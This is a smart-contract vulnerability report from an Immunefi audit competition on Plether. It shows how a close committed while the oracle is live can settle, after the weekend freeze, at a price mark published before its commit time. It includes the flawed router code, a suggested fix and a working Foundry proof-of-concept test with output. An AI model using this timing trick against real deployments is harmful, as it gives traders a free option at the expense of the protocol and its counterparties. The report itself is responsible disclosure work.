# \#99602 [SC-Low] A close committed while the oracle is live loses its MEV boundary if executed after the freeze, and settles at a mark published before its own `commitTime`

**Submitted on Nov 14th 2026 at 12:47:06 UTC by @Web3Vinay for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99602
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

### Brief/Intro

Plether promises that delayed orders settle at the first price **after** their `commitTime`. It also promises that binding orders stop traders from "turning queued intents into free options". This holds even during market closures, where the frozen regime is "a deliberate trade-off ... **without weakening live-market MEV protections**" (`SECURITY.md:658-659`, `:845`).

The router skips the MEV boundary based on the oracle regime at **execution** time, not at **commit** time. So a close committed while the market is **live** can be executed one second after the Friday freeze boundary (or the start of a governance override day). It then settles at the stored Engine mark, which was published **before** the order was committed. The trader gets a choice they were promised not to have: settle at the post-commit live tick, or at the older pre-commit mark.

### Vulnerability Details

```solidity
// packages/perps/src/OrderRouterExecutionSidecar.sol:447-452
@> if (!request.oracleFrozen && ExecutionBlockNumberLib.current() == order.commitBlock) {
       return _pendingResult(order.orderId, OrderV3Types.PendingReason.SameBlock);
   }
@> if (!request.oracleFrozen && request.oraclePublishTime <= order.commitTime) {
       return _pendingResult(order.orderId, OrderV3Types.PendingReason.MevBoundary);
   }
```

- `request.oracleFrozen` reflects the regime at execution (`src/libraries/MarketCalendarLib.sol:38-41`). Nothing checks which regime the order was committed in.
- In the frozen regime, `PletherOracle` prices the order from `engine.lastMarkPrice()/lastMarkTime()`. The only bound is `fadMaxStaleness` (3 days) (`src/PletherOracle.sol:588-593, 729-743`). That mark can predate `order.commitTime`.
- The frozen relaxation is documented for the case "once feeds are genuinely offline" (`SECURITY.md:824`). Here the order was committed while feeds were live and a post-commit tick existed.

Sequence (Friday, freeze at 22:00 UTC):
1. 21:50: the last on-chain mark is `1.00`.
2. The real basket moves to `1.02`, against the trader's LONG.
3. 21:59:58 (live): the trader commits a full close. `commitTime` is greater than the mark time.
4. 22:00:01 (frozen): the trader executes the order themselves. Close bounty is 0 (`DEPLOYMENT.md:150`) and execution is permissionless. Both checks above are skipped, and the order settles at the 21:50 mark minus the 50 bps frozen spread.

If the price had moved in the trader's favour instead, they would execute before 22:00 at the live tick.

### Impact Details

- **Guarantee broken:** a live-committed order settles at a price published **598 s before** its `commitTime`. This contradicts `SECURITY.md:647` (bound to the first tick after `commitTime`), `:658-659` (no free options) and `:845` (live-market MEV protections not weakened).
- **No value lost beyond the documented behaviour:** a close committed *inside* the freeze (22:00:01) gets the same stored mark (|B − C| = 0.000026 USDG in the PoC). The value difference against the promised post-commit price (B − A = 1,500.80 USDG per 100k notional at a 2% move) is the documented frozen stale-mark exit. This bug does not add to it. That is why this report is submitted at Low.
- The issue occurs at every scheduled freeze boundary and at every governance override day boundary (`MarketCalendarLib.sol:51-57`).

### Mitigation

Key the relaxation on the commit regime. In `_executePrepared`, keep the MEV boundary for frozen execution when the order was committed while live:

```solidity
bool committedFrozen = /* regime at order.commitTime was oracleFrozen */;
if ((!request.oracleFrozen || !committedFrozen) && request.oraclePublishTime <= order.commitTime) {
    return _pendingResult(order.orderId, OrderV3Types.PendingReason.MevBoundary);
}
```

A simpler option is to store an `oracleFrozenAtCommit` flag on the order at `commitOrder`. Orders committed while live then stay Pending until a post-commit price exists, or until they expire.

### References

- `packages/perps/src/OrderRouterExecutionSidecar.sol:447` (same-block check, gated by `!oracleFrozen`)
- `packages/perps/src/OrderRouterExecutionSidecar.sol:450` (MEV boundary, gated by `!oracleFrozen`)
- `packages/perps/src/libraries/MarketCalendarLib.sol:38-41, 51-57` (freeze boundary and override days)
- `packages/perps/src/PletherOracle.sol:588-593, 729-743` (frozen pricing uses the stored Engine mark)
- `packages/perps/SECURITY.md:647, 658-659, 824, 845` (promised guarantees and frozen scope)
- `packages/perps/DEPLOYMENT.md:150` (close bounty = 0)

## Proof of Concept

## Proof of Concept

Save as `packages/perps/test/hunt_h5report/H5FrozenBoundary.t.sol` and run from `packages/perps`:

```
FOUNDRY_TEST=test/hunt_h5report forge test --match-contract H5FrozenBoundaryTest -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../perps/BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {console2} from "forge-std/Test.sol";

/// A close committed while the oracle is LIVE, executed 1s after the freeze boundary,
/// settles at an Engine mark published BEFORE its commitTime (MEV boundary skipped).
contract H5FrozenBoundaryTest is BasePerpTest {

    address alice = address(0xA11CE);

    // Friday 2024-03-08 00:00 UTC (standard time -> FX close / freeze at 22:00 UTC)
    uint256 constant FRIDAY_0000 = 1_709_856_000;
    uint256 constant BOUNDARY = FRIDAY_0000 + 22 hours;
    uint256 constant NOTIONAL = 100_000e18;

    function _step(uint256 t) internal {
        vm.warp(t);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _setMark(uint256 price) internal {
        vm.prank(address(router));
        engine.updateMarkPrice(price, uint64(vm.getBlockTimestamp()));
    }

    function _value() internal view returns (uint256) {
        return clearinghouse.balanceAssets(alice) + engine.traderClaimBalanceAssets(alice);
    }

    function _execFrozen(uint64 id) internal {
        bytes[] memory empty = new bytes[](1);
        empty[0] = "";
        vm.prank(alice);
        router.executeOrder{value: 0.01 ether}(id, empty);
    }

    function test_liveCommittedClose_settlesAtPreCommitMark() public {
        _fundTrader(alice, 50_000e6);
        vm.deal(alice, 10 ether);

        // 21:00 open LONG 100k @1.00; 21:50 last on-chain mark @1.00
        _step(BOUNDARY - 1 hours);
        _setMark(1e8);
        _open(alice, CfdTypes.Side.LONG, NOTIONAL, 10_000e6, 1e8);
        _step(BOUNDARY - 10 minutes);
        _setMark(1e8);
        uint256 markTime = engine.lastMarkTime();
        uint256 snap0 = vm.snapshotState();

        // 21:59:58 (LIVE): alice commits a full close. Real basket is now 1.02 (against the LONG).
        _step(BOUNDARY - 2);
        assertFalse(engine.isOracleFrozen(), "commit is in the live regime");
        vm.prank(alice);
        uint64 id = router.commitOrder(CfdTypes.Side.LONG, NOTIONAL, 0, 0, true);
        uint256 commitTime = vm.getBlockTimestamp();
        uint256 snap1 = vm.snapshotState();

        // A) Promised behaviour: settle at the first post-commit tick (1.02)
        _step(BOUNDARY - 1);
        baseMockPyth.setAllUniquePrices(_basePythFeedIds(), int64(1.02e8), 0, int32(-8), BOUNDARY - 1, BOUNDARY - 5);
        bytes[] memory data = new bytes[](1);
        data[0] = abi.encode(uint256(1.02e8));
        vm.prank(alice);
        router.executeOrder{value: 0.01 ether}(id, data);
        uint256 vA = _value();
        vm.revertToState(snap1);

        // B) Same live-committed order, executed 1s after the freeze boundary
        _step(BOUNDARY + 1);
        assertTrue(engine.isOracleFrozen(), "execution is frozen");
        _execFrozen(id);
        (uint256 sizeB,,,,,,) = engine.positions(alice);
        assertEq(sizeB, 0, "B closed");
        assertEq(engine.lastMarkTime(), markTime, "B settled on the stored 21:50 mark");
        assertLt(markTime, commitTime, "GUARANTEE BROKEN: settlement price published before commitTime");
        uint256 vB = _value();
        vm.revertToState(snap0);

        // C) Reference: close committed inside the freeze (documented frozen behaviour)
        _step(BOUNDARY + 1);
        vm.prank(alice);
        uint64 idC = router.commitOrder(CfdTypes.Side.LONG, NOTIONAL, 0, 0, true);
        _step(BOUNDARY + 3);
        _execFrozen(idC);
        uint256 vC = _value();

        console2.log("mark publish time        :", markTime);
        console2.log("order commit time        :", commitTime);
        console2.log("A live @ post-commit tick:", vA);
        console2.log("B live commit, frozen exe:", vB);
        console2.log("C frozen commit + exe    :", vC);
        console2.log("B - A (guarantee gap)    :", vB - vA);
        console2.log("|B - C| (extra value)    :", vB > vC ? vB - vC : vC - vB);
        assertGt(vB, vA);
        assertApproxEqAbs(vB, vC, 1e3, "no value beyond documented frozen close");
    }
}
```

Result (actually run, pinned commit `a82d4fe`, Forge 1.7.1):

```
Ran 1 test for test/hunt_h5report/H5FrozenBoundary.t.sol:H5FrozenBoundaryTest
[PASS] test_liveCommittedClose_settlesAtPreCommitMark() (gas: 5159667)
Logs:
  mark publish time        : 1709934600
  order commit time        : 1709935198
  A live @ post-commit tick: 47919153761
  B live commit, frozen exe: 49419953735
  C frozen commit + exe    : 49419953709
  B - A (guarantee gap)    : 1500799974
  |B - C| (extra value)    : 26
```

The order was committed at 21:59:58, while the oracle was live, and settled on a mark published at 21:50:00, which is 598 s **before** its `commitTime`.
